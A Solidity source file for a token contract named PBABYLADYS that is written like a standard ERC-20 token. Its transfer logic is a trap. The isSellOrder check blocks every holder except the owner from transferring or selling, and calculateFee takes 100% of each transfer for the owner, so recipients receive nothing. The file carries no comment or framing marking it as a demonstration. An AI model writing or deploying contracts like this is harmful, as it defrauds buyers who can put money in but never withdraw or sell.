// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

contract PBABYLADYS {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    constructor() {
        name = "PBABYLADYS";
        symbol = "babyladys";
        decimals = 18;
        totalSupply = 10000000000000 * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid address");
        require(_value > 0 && _value <= balanceOf[msg.sender], "Insufficient balance");
        require(!isSellOrder(msg.sender), "Selling not allowed");

        uint256 fee = calculateFee(_value);
        uint256 amountToTransfer = _value - fee;

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += amountToTransfer;
        balanceOf[owner] += fee;

        emit Transfer(msg.sender, _to, amountToTransfer);
        emit Transfer(msg.sender, owner, fee);

        return true;
    }

    function calculateFee(uint256 _value) internal pure returns (uint256) {
        return (_value * 100) / 100;
    }

    function isSellOrder(address _from) internal view returns (bool) {
        return (_from != owner);
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_to != address(0), "Invalid address");
        require(_value > 0 && _value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Insufficient allowance");
        require(!isSellOrder(_from), "Selling not allowed");

        uint256 fee = calculateFee(_value);
        uint256 amountToTransfer = _value - fee;

        balanceOf[_from] -= _value;
        balanceOf[_to] += amountToTransfer;
        balanceOf[owner] += fee;
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, amountToTransfer);
        emit Transfer(_from, owner, fee);
        emit Approval(_from, msg.sender, allowance[_from][msg.sender]);

        return true;
    }
}